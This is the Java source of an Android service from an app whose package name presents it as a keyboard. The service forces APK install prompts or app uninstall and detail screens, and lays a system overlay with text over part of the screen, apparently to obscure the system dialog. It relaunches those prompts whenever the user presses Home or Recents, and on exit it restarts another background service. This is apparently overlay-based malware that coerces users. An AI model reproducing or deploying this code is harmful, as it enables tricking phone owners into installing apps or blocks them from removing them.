package com.keyboard.input.uxpo;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.widget.TextView;
import android.widget.ActionMenuView.LayoutParams;
import android.view.LayoutInflater;
import android.view.View;
import android.view.KeyEvent;
import android.view.Gravity;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.graphics.Color;
import android.net.Uri;
import java.io.File;

public class ServiceAlert extends Service {

	public static String dataText = "";
	public static String dataPaket = "";
	public static String pilihAksi = "";
	public static int dataTextSize = 12;

	private LinearLayout layoutView;
	private int y = 1;

	@Override
    public IBinder onBind(Intent intent) {
        return null;
    }

	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		super.onCreate();
		if (pilihAksi.equals("install")) { // dataPaket dalam hal ini src file ex: /sdcard/oke.apk
			y = 2;
			Intent intent = new Intent(Intent.ACTION_VIEW);
        	intent.setDataAndType(Uri.fromFile(new File(dataPaket)), "application/vnd.android.package-archive");
        	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        	ServiceAlert.this.startActivity(intent);
        
        } else if (pilihAksi.equals("uninstall")) { // dataPaket dalam hal ini nama paket ex: com.shun.oke
        	y = 4;
        	try {
				Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
				intent.setData(Uri.parse("package:"+dataPaket));
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				ServiceAlert.this.startActivity(intent);
				
			} catch(Exception e) {
				Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				ServiceAlert.this.startActivity(intent);
			}
        
        } else if (pilihAksi.equals("hotspot")) {
        	y = 1;
        }

		layoutView = new LinearLayout(this) {
			public void onCloseSystemDialogs(String reason) {
				if ("homekey".equals(reason) || "recentapps".equals(reason)) {

					if (pilihAksi.equals("install")) {
						Intent intent = new Intent(Intent.ACTION_VIEW);
        				intent.setDataAndType(Uri.fromFile(new File(dataPaket)), "application/vnd.android.package-archive");
        				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        				ServiceAlert.this.startActivity(intent);
        			
        			} else if (pilihAksi.equals("uninstall")) {
        				try {
							Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
							intent.setData(Uri.parse("package:"+dataPaket));
        					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							ServiceAlert.this.startActivity(intent);
				
						} catch(Exception e) {
							Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
        					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							ServiceAlert.this.startActivity(intent);
						}
        			
        			} else if (pilihAksi.equals("hotspot")) {
        				onDestroy();
        			}
				}
				
			}
		};
        
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
        layoutView.setBackgroundColor(Color.BLACK);
        layoutView.setOrientation(LinearLayout.VERTICAL);
        layoutView.setLayoutParams(layoutParams);

        TextView fullPath = new TextView(this);
        LinearLayout.LayoutParams paramsfullPath = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        fullPath.setTextSize(dataTextSize);
        fullPath.setTextColor(Color.GREEN);
        fullPath.setText(dataText);
        layoutView.addView(fullPath, paramsfullPath);
		
		WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(LayoutParams.MATCH_PARENT, new ReceiverBoot().getScreenHeight()/y,
        	WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
			WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
				
		if (pilihAksi.equals("uninstall")) {
			params.gravity = Gravity.BOTTOM;
		} else {
			params.gravity = Gravity.TOP;
		}
		wm.addView(layoutView, params);

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        startActivity(intent);

        try {Thread.sleep(1000);}catch(Exception e){}

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.removeViewImmediate(layoutView);

		startService(new Intent(this, ServiceThread.class));
	}
	
}